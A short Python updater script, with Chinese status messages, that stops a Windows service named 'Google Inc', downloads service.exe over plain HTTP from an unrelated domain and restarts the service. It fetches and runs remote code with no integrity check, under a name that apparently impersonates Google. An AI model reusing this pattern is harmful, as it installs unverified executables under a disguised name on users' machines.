import os
import sys
import requests
import subprocess

SERVICE_NAME = "Google Inc"
UPDATE_URL = "http://vm.beihui.xyz/download/service.exe"

def get_executable_dir():
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))
    
def download_update():
    response = requests.post(UPDATE_URL, stream=True)
    if response.status_code == 200:
        with open("service.exe", "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                f.write(chunk)
        print("檔案下載完成，已保存為 service.exe")
    else:
        print(f"下載失敗，狀態碼: {response.status_code}")

if __name__ == "__main__":
    subprocess.run(["nssm", "stop", SERVICE_NAME], check=True)
    download_update()
    subprocess.run(["nssm", "start", SERVICE_NAME], check=True)